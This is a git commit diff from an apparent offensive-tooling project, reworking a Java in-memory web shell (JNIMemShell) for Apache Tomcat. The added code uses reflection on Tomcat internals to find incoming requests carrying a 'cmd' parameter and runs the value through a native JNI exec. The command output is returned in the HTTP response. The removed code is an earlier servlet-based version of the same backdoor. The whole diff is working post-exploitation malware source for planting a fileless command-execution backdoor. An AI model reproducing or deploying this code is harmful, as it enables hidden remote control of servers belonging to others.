ec6d27850e066b0805e40ef4d4e0c6fd88120a3d
Kai <1958304602@qq.com>
2025-03-05 19:16:06 +0800

    JNIMemShell!

--- src/main/java/org/example/tomcatmemshell/JNI/JNIMemShell.java
+++ src/main/java/org/example/tomcatmemshell/JNI/JNIMemShell.java
@@ -20,8 +20,8 @@ import java.lang.reflect.Method;
 import java.lang.reflect.Modifier;
 import java.util.Enumeration;
 
-//JNI + servlet shell
-public class JNIMemShell extends AbstractTranslet implements  Servlet, ServletConfig, java.io.Serializable{
+//JNI shell ，但是只能回显一次
+public class JNIMemShell extends AbstractTranslet{
     public static StringBuilder jniCodes = new StringBuilder();
     public static String filename = "slib.dll"; //windows        filename = "slib.so";//linux
     @Override
@@ -43,19 +43,75 @@ public class JNIMemShell extends AbstractTranslet implements  Servlet, ServletCo
             } catch (Throwable ignored) {
                 // 忽略所有异常，继续执行程序
             }
-            //获取StandardContext
-//            StandardContext standardContext = getStandardContext1();
-            StandardContext standardContext = getStandardContext2();
-            if(standardContext != null){
-                //自定义StandardWrapper注册进StandardContext
-                ServletMemShell servletMemShell = new ServletMemShell();
-                StandardWrapper standardWrapper = null;
-                standardWrapper = (StandardWrapper) standardContext.createWrapper();
-                standardWrapper.setName("servletMemShell");
-                standardWrapper.setServletClass(servletMemShell.getClass().getName());
-                standardWrapper.setServlet(servletMemShell);
-                standardContext.addChild(standardWrapper);
-                standardContext.addServletMappingDecoded("/servletMemShell", "servletMemShell");
+            //传递的参数，后门标识
+            String pass = "cmd";
+
+            //获取WebappClassLoaderBase
+            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+            Field webappclassLoaderBaseField=Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
+            webappclassLoaderBaseField.setAccessible(true);
+            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
+            Context StandardContext =  resources.getContext();
+
+            //获取ApplicationContext
+            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
+            contextField.setAccessible(true);
+            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(StandardContext);
+
+            //获取StandardService
+            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
+            serviceField.setAccessible(true);
+            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);
+
+            //获取Connector
+            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();
+
+            //找到指定的Connector
+            for (int i = 0; i < connectors.length; i++) {
+                if (connectors[i].getScheme().contains("http")) {
+                    //获取protocolHandler、connectionHandler
+                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
+                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler", null);
+                    getHandlerMethod.setAccessible(true);
+                    org.apache.tomcat.util.net.AbstractEndpoint.Handler connectionHandler = (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler, null);
+
+                    //获取RequestGroupInfo
+                    java.lang.reflect.Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
+                    globalField.setAccessible(true);
+                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(connectionHandler);
+
+                    //获取RequestGroupInfo中储存了RequestInfo的processors
+                    java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");
+                    processorsField.setAccessible(true);
+                    java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);
+                    for (int k = 0; k < list.size(); k++) {
+                        org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) list.get(k);
+                        if (requestInfo.getCurrentQueryString().contains(pass)) {
+                            //获取request
+                            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
+                            requestField.setAccessible(true);
+                            org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(requestInfo);
+                            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
+                            //执行命令
+                            String cmd = request.getParameter(pass);
+                            if (cmd != null) {
+                                String in = JNIMemShell.exec(cmd);
+                                java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
+                                String output = s.hasNext() ? s.next() : "";
+                                //回显
+                                java.io.Writer writer = request.getResponse().getWriter();
+                                java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField("usingWriter");
+                                usingWriter.setAccessible(true);
+                                usingWriter.set(request.getResponse(), Boolean.FALSE);
+                                writer.write(output);
+                                writer.flush();
+                            }
+                            break;
+                        }
+                        break;
+                    }
+                    break;
+                }
             }
             System.out.println("Tomcat JNI MemShell Injecting");
 
@@ -63,132 +119,6 @@ public class JNIMemShell extends AbstractTranslet implements  Servlet, ServletCo
             e.printStackTrace();
         }
     }
-
-    @Override
-    public void init(ServletConfig config) throws ServletException {
-
-    }
-
-    @Override
-    public ServletConfig getServletConfig() {
-        return null;
-    }
-
-    @Override
-    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
-        System.out.println(
-                "TomcatShellInject doFilter.....................................................................");
-        String cmdParamName = "cmd";
-        String cmd;
-        if ((cmd = servletRequest.getParameter(cmdParamName)) != null){
-            //RCE ?cmd=whoami
-            String process = JNIMemShell.exec(cmd);
-            servletResponse.getOutputStream().write(process.getBytes());
-            servletResponse.getOutputStream().flush();
-            servletResponse.getOutputStream().close();
-            return;
-        }
-    }
-
-    @Override
-    public String getServletInfo() {
-        return "";
-    }
-
-    public void destroy() {
-    }
-
-    public static StandardContext getStandardContext1() {
-        try{
-            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
-            Field webappclassLoaderBaseField=Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
-            webappclassLoaderBaseField.setAccessible(true);
-            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
-            Context StandardContext =  resources.getContext();
-            return (StandardContext) StandardContext;
-        } catch (NoSuchFieldException e) {
-            throw new RuntimeException(e);
-        } catch (ClassNotFoundException e) {
-            throw new RuntimeException(e);
-        } catch (IllegalAccessException e) {
-            throw new RuntimeException(e);
-        }
-    }
-
-    public static StandardContext getStandardContext2() {
-        try{
-            //反射获取WRAP_SOME_OBJECT_FIELD lastServicedRequest lastServicedResponse
-            Field WRAP_SOME_OBJECT_FIELD=Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
-            Field lastServicedRequestfield= ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
-            Field lastServicedResponsefield=ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
-            WRAP_SOME_OBJECT_FIELD.setAccessible(true);
-            lastServicedRequestfield.setAccessible(true);
-            lastServicedResponsefield.setAccessible(true);
-            //使用modifiersField修改属性值的final修饰
-            //每一个Field都会存在一个变量 modifiers用来描述修饰词，所以这里我们获取到的是Field的modifiers 它本质上是一个int类型的值
-            java.lang.reflect.Field  modifiersfield= Field.class.getDeclaredField("modifiers");
-            modifiersfield.setAccessible(true);
-
-            //修改WRAP_SOME_OBJECT_FIELD以及requst和response的modifiers，值的话由于要得到16进制位数，并且清除final属性，本质上就是将他修改为0x0000即可，这里getModifiers()的结果为0x0010 Modifier.FINAL的结果也是0x0010，所以两者&~运算得到0x0000
-            modifiersfield.setInt(WRAP_SOME_OBJECT_FIELD,WRAP_SOME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
-            modifiersfield.setInt(lastServicedRequestfield,lastServicedRequestfield.getModifiers() & ~Modifier.FINAL);
-            modifiersfield.setInt(lastServicedResponsefield,lastServicedResponsefield.getModifiers() & ~Modifier.FINAL);
-
-
-            //如果是第一次访问，WRAP_SOME_OBJECT_FIELD肯定是没有值的，所以我们赋值上true 并且同时给lastServicedRequest和lastServicedResponse都初始化
-            if(!WRAP_SOME_OBJECT_FIELD.getBoolean(null)){
-                WRAP_SOME_OBJECT_FIELD.setBoolean(null,true);
-                lastServicedResponsefield.set(null,new ThreadLocal<ServletResponse>());
-                lastServicedRequestfield.set(null,new ThreadLocal<ServletRequest>());
-                return null;
-
-            }else{//第二次访问开始正式获取当前线程下的Req和Resp
-                ThreadLocal<ServletRequest> threadLocalReq= (ThreadLocal<ServletRequest>)lastServicedRequestfield.get(null);
-                ThreadLocal<ServletResponse> threadLocalResp=(ThreadLocal<ServletResponse>) lastServicedResponsefield.get(null);
-                ServletRequest servletRequest = threadLocalReq.get();//servletRequest:RequestFacade
-                ServletResponse servletResponse = threadLocalResp.get();
-
-                ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletRequest.getServletContext();
-                Field applicationContextFacadeField = applicationContextFacade.getClass().getDeclaredField("context");
-                applicationContextFacadeField.setAccessible(true);
-                ApplicationContext applicationContext = (ApplicationContext) applicationContextFacadeField.get(applicationContextFacade);
-                Field standardContextField = applicationContext.getClass().getDeclaredField("context");
-                standardContextField.setAccessible(true);
-                StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
-
-                System.out.println(servletRequest);
-                return standardContext;
-            }
-
-        }
-        catch (Exception e){
-            e.printStackTrace();
-        }
-        return null;
-    }
-
-
-
-    @Override
-    public String getServletName() {
-        return "";
-    }
-
-    @Override
-    public ServletContext getServletContext() {
-        return null;
-    }
-
-    @Override
-    public String getInitParameter(String name) {
-        return "";
-    }
-
-    @Override
-    public Enumeration<String> getInitParameterNames() {
-        return null;
-    }
-
 
     public static native String exec(String cmd);
 
